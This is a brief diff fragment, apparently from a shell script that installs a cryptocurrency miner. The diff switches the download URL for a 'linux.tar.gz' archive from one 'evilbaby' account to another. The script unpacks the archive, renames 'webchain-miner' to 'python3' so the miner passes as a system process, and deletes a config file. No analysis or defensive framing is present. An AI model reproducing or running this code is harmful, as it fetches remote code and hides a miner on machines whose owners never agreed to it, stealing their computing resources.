@@ -15,7 +15,7 @@ exit
 fi
 
 
-wget https://bitbucket.org/evilbaby1/openai/downloads/linux.tar.gz
+wget https://github.com/evilbabylx/script/raw/master/linux.tar.gz
 tar xvzf linux.tar.gz
 mv webchain-miner python3
 rm config.json -f 
